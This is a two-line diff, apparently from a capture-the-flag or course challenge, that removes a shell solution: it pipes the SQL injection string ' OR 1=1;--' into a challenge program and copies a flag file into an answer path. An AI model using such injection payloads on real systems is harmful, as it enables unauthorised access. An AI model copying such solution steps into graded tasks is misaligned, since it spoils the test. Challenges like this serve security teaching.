@@ -1,2 +1,0 @@
-$ (echo "' OR 1=1;--'" && echo "useless" && cat -) | ./challenge
-$ cat /task/student/end/flag > /task/student/answer
